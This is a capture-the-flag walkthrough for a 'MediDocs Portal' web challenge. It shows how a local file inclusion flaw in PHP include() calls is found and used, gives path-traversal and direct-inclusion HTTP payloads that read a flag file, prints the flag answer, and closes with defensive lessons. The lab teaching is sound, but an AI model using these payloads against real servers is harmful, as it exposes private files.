# 📂 MediDocs Portal – Local File Inclusion Walkthrough (Challenge 3)

## 📌 Overview

* **Category:** Web Exploitation
* **Challenge Type:** Local File Inclusion (LFI) / Path Traversal
* **Target:** `/lfi/?page=home.php`
* **Goal:** Retrieve the flag from:

  ```
  /opt/medidocs/flag1.txt
  ```

---

## 🔍 Recon & Initial Analysis

The MediDocs Portal dynamically loads pages using URL parameters.

From the **About page**, the application reveals its architecture:

```php
include("pages/" . $page);
include($lang);
```

### 🧠 Key Observations:

* `page` is prefixed with `pages/`
* `lang` is included **directly without restriction**

This immediately suggests a potential **Local File Inclusion (LFI)** vulnerability.

---

## 🧪 Step 1 – Identifying the Injection Point

Captured request in Burp Suite:

```http id="7y2yyd"
GET /lfi/?page=home.php
```

This confirms that the `page` parameter controls which file is included.

---

## ⚠️ Step 2 – Testing Path Traversal

Attempt to escape the `pages/` directory:

```http id="t35u3y"
GET /lfi/?page=../../../../opt/medidocs/flag1.txt
```

### Result:

* The application successfully included the file

### ✅ Conclusion:

> The application is vulnerable to **directory traversal via LFI**

---

## 🔓 Step 3 – Exploiting the `lang` Parameter

From the architecture:

```php
include($lang);
```

👉 No directory restriction is applied

### Payload:

```http id="d4wfdn"
GET /lfi/?page=home.php&lang=/opt/medidocs/flag1.txt
```

### Result:

* The flag file is directly included and displayed

---

## 🚀 Step 4 – Alternative Exploits

Multiple payloads successfully retrieved the flag:

### 🔹 Direct Path Traversal (page)

```http id="qgxtkz"
GET /lfi/?page=../../../../opt/medidocs/flag1.txt
```

### 🔹 Direct Inclusion (lang)

```http id="svm2bh"
GET /lfi/?page=home.php&lang=/opt/medidocs/flag1.txt
```
---

## 🏁 Flag

```text id="d8p9gc"
CYBR3200{path_traversal_read_the_world_a3f9}
```

---

## 🧠 Key Takeaways

### 🔹 1. Dynamic File Inclusion Is Dangerous

* Using `include()` with user input introduces LFI risk

---

### 🔹 2. Path Traversal Enables File Access

* `../` allows escaping restricted directories
* Can expose sensitive system files

---

### 🔹 3. Multiple Entry Points Increase Risk

* `page` → partially restricted
* `lang` → completely unrestricted

---

### 🔹 4. Transparency Can Introduce Vulnerabilities

* The About page exposed implementation details
* Helped identify the exact attack vector

---

## 🔐 Security Lessons

This challenge highlights the importance of:

* Validating and sanitizing user input
* Restricting file inclusion to safe directories
* Using allowlists for file loading
* Avoiding direct use of user-controlled input in `include()`

---

## 💬 Final Thoughts

This challenge demonstrates how:

> Improper handling of file inclusion can lead to full disclosure of sensitive files.

With minimal effort, an attacker can:

* Traverse directories
* Access protected files
* Extract confidential information

---

## ✍️ Author

AJ Flower

